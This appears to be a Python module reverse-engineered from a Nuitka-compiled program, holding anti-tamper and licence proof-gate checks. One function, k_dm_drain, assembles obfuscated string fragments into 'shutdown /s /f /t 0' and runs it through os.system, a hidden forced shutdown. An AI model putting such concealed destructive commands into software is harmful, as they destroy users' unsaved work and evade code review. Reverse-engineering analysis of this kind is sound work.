# Recovered module: src.py.com.yun.mao.fea._hb_yt_file
# Static reconstruction from the Nuitka module table, constant chunk and the
# module init at 0x56901f0.
#
# This module uses the ``os.system`` variant; no Popen slot is present in its
# constant pool.  The proof helpers feed the shared ``_pl_wd_file`` ledger;
# the proof-gate order is confirmed by the decompiled ``po_xu_snap`` body.
from __future__ import annotations

import hashlib
import hmac
import os
import time
from typing import Any

from ..link._fds_jm import sec
from . import _cmd_ops, _pl_wd_file

# Module metadata
# nuitka_table_index = 1788
# module_init_rva = 0x56901f0
# flags = 0x10


def _tg(n: int) -> bytes:
    """Return the eight-byte witness (6-byte buffer + 2-byte big-endian value)."""

    value = int(n)
    buf = bytearray(b"\x00\x00\x00\x00\x00\x00")
    for i in range(4):
        buf[i] = (((value * 17) ^ 165) & 255)
    return bytes(buf) + value.to_bytes(2, "big")


def _parts_mac(key: bytes, parts: bytes | tuple) -> bytes:
    acc = hmac.new(bytes(key), digestmod=hashlib.sha256)
    if isinstance(parts, (bytes, bytearray, memoryview)):
        parts = (parts,)
    for part in parts:
        acc.update(bytes(part))
    return acc.digest()


def _open_cap(code: bytes, cap: Any) -> bool:
    try:
        return bool(_pl_wd_file._unseal(bytes(code), cap))
    except (AssertionError, TypeError, ValueError):
        return False


def _kk(v: int) -> int:
    return _mix(v, 7)


def _mix(v: int, t: int) -> int:
    """Mix two integers with the module's confirmed arithmetic slots.

    The decompiled body confirms ``v * 668265261 + 73244475``, the 32-bit
    mask, the 7/25-bit shifts and the final ``^ 16``.
    """

    value = int(v)
    mixed = (value * 668265261 + 73244475) & 0xFFFFFFFF
    mixed ^= int(t) >> 7
    return ((mixed >> 25) ^ (mixed << 7) ^ 16) & 0xFFFFFFFF


def _km(kid: str) -> bytes:
    try:
        return bytes(_pl_wd_file._kid_mac(str(kid or "")))
    except (AssertionError, TypeError, ValueError):
        return b""


def _ready() -> bool:
    return bool(_pl_wd_file._ready and _pl_wd_file._sk is not None)


def _chk_caps(obj: Any) -> bool:
    if obj is None:
        return False
    caps = getattr(obj, "caps", None)
    if caps is None:
        caps = getattr(obj, "_caps", None)
    if caps is None:
        cap = getattr(obj, "cap", None)
        caps = () if cap is None else (cap,)
    if isinstance(caps, _pl_wd_file._Cap):
        caps = (caps,)
    code = getattr(obj, "code", b"") or getattr(obj, "tag", b"")
    try:
        return bool(caps) and all(_open_cap(code, cap) for cap in caps)
    except (TypeError, ValueError):
        return False


def _chk_kid(obj: Any, kid: str, got: Any) -> bool:
    digest = hashlib.sha256(str(kid or "").encode("utf-8")).digest()
    expected = got if got is not None else _pl_wd_file._kid_ring.get(digest)
    current = _km(kid)
    try:
        return bool(expected) and bool(current) and hmac.compare_digest(
            bytes(expected),
            current,
        )
    except (TypeError, ValueError):
        return False


def _chk_acct(obj: Any, _sq_jqm: Any = None, fn: Any = None) -> bool:
    if callable(fn):
        try:
            return bool(fn(obj))
        except Exception:
            return False
    module = _sq_jqm or _cmd_ops.load_attr("src.py.com.yun.mao.fea._sq_jqm")
    info = getattr(module, "current_account_info", None)
    ensure = getattr(info, "ensure_valid", None)
    if callable(ensure):
        try:
            return bool(ensure())
        except Exception:
            return False
    return bool(getattr(info, "ucode", ""))


def _record(now: float, reason: int, entry: int, n: int, ph: int) -> bool:
    try:
        repeated = bool(_pl_wd_file._bump_suspect_locked(float(now)))
    except (AttributeError, TypeError, ValueError):
        repeated = False
    try:
        _pl_wd_file.q_lg(int(reason), int(reason), int(entry), int(n), int(ph))
    except (AttributeError, TypeError, ValueError):
        pass
    return repeated


def _chk_gy(obj: Any) -> bool:
    result = _cmd_ops.optional_call(obj, ("gy_ok", "_gy_ok", "on_gy_ok"))
    return True if result is None else bool(result)


def _chk_uc(obj: Any) -> bool:
    return _chk_acct(obj)


def _mark_bad(obj: Any) -> bool:
    _ = obj
    return False


def _fan_hooks(obj: Any) -> bool:
    result = _cmd_ops.optional_call(
        obj,
        ("proof_ok", "_proof_ok", "on_proof_ok", "fan_hooks"),
    )
    return bool(result) if result is not None else False


def k_dm_drain() -> None:
    """Join the encoded fragments and pass ``shutdown /s /f /t 0`` to ``os.system``."""

    _sy = "".join(
        sec(_key)
        for _key in (
            "kf_pq_3w",
            "vu_hn_7e",
            "ys_ld_5c",
            "ig_mr_9a",
        )
    )
    _z = sec("eg_rn_8s")
    _os = os
    _pair = (sec("bt_xo_2f"), sec("ph_cj_6u"))
    _exe = _z.join(
        (
            _sy,
            _pair[0],
            _pair[1],
            sec("dw_ke_0r"),
            sec("uy_bp_4h"),
        )
    )
    _sp = _os.system
    _line = _exe
    try:
        _sp(_line)
    except Exception:
        pass


def po_xu_snap(obj: Any = None) -> bool:
    """Run the capability/kid/account checks, then the optional hook."""

    now = time.time()
    try:
        with _pl_wd_file._g_mz:
            ok0 = bool(_ready() and _chk_caps(obj))
            kid = getattr(obj, "kid", "") or getattr(obj, "ucode", "")
            got = getattr(obj, "kid_mac", None)
            r0 = _pl_wd_file.w_cd(
                ok0,
                _chk_kid(obj, str(kid), got),
                _chk_gy(obj),
                _chk_uc(obj),
            )
            if r0 != 9:
                _record(now, r0, 7, _kk(len(_pl_wd_file._ph)), 0)
                return _mark_bad(obj)
        fire = _fan_hooks(obj)
        return bool(fire or obj is None)
    except Exception:
        _record(now, 1, 7, 0, 0)
        return _mark_bad(obj)


def w_k2_gaze(obj: Any = None) -> None:
    """Public hook entry; the body reaches the proof hook dispatcher."""

    try:
        _fan_hooks(obj)
    except Exception:
        return None
    return None

